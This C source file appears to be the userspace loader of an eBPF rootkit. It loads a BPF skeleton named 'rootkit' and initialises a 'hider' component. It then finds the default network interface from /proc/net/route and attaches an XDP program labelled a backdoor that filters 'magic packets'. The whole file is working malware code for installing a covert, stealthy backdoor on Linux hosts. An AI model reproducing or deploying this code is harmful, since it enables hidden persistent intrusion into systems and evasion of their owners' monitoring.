#include <bpf/libbpf.h>
#include <errno.h>
#include <linux/if_link.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "config.h"
#include "rootkit.skel.h"
#include "userspace/hider.h"

#define LINE_LEN     256
#define DEV_NAME_LEN 64

/**
 * @brief Get the index of the default active interface by reading /proc/net/route
 *
 * @return int iface index
 */
static int get_default_iface_index() {
    char line[LINE_LEN];
    char dev[DEV_NAME_LEN];
    unsigned long dest;

    FILE *f = fopen("/proc/net/route", "r");
    if (!f)
        return -ENOENT;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%63s %lx", dev, &dest) == 2) {
            /* Destination 0.0.0.0 indicates default route interface */
            if (dest == 0 && strcmp(dev, "lo") != 0) {
                int if_index = if_nametoindex(dev);
                if (if_index == 0) {
                    fclose(f);
                    return -ENOENT;
                }
                fclose(f);
                return if_index;
            }
        }
    }
    fclose(f);
    return -ENODEV;
}

/**
 * @brief Load XDP backdoor
 *
 * @param skel Rootkit skeleton
 * @return int 0 on success
 */
static int load_xdp_backdoor(struct rootkit *skel) {
    int if_index = get_default_iface_index();

    if (if_index < 0)
        return if_index;

    skel->links.filter_magic_packets =
        bpf_program__attach_xdp(skel->progs.filter_magic_packets, if_index);

    return libbpf_get_error(skel->links.filter_magic_packets);
}

struct rootkit *loader_load_rootkit(void) {
    int ret;
    struct rootkit *skel;

    skel = rootkit__open();
    if (!skel) {
        perror("Failed to open BPF skeleton");
        return NULL;
    }

    ret = rootkit__load(skel);
    if (ret) {
        perror("Failed to load and verify BPF skeleton");
        rootkit__destroy(skel);
        return NULL;
    }

    hider_context_t hider_ctx = {.skel = skel, .is_initialized = false};

    ret = hider_init(&hider_ctx);
    if (ret) {
        perror("Failed to initialize hider");
        rootkit__destroy(skel);
        return NULL;
    }

    ret = load_xdp_backdoor(skel);
    if (ret) {
        perror("Failed to attach XDP backdoor");
        rootkit__destroy(skel);
        return NULL;
    }

    ret = rootkit__attach(skel);
    if (ret) {
        perror("Failed to attach BPF skeleton");
        rootkit__destroy(skel);
        return NULL;
    }

    return skel;
}

void loader_unload_rootkit(struct rootkit *skel) {
    rootkit__destroy(skel);
}
